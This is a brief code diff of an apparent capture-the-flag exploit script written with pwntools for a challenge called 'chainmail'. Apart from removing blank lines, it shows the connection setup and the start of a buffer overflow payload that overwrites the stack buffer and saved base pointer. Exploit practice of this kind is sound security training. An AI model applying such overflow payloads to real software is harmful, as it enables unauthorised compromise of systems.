@@ -3,10 +3,8 @@ from pwn import *
 
 if not args.REMOTE:
     target = process("./chal")
-
 else:
     target = remote("chainmail.chal.uiuc.tf", 1337)
-
 
 payload = b"A" * 64 # overwrite buffer
 payload += b"B" * 8 # overwrite saved rbp
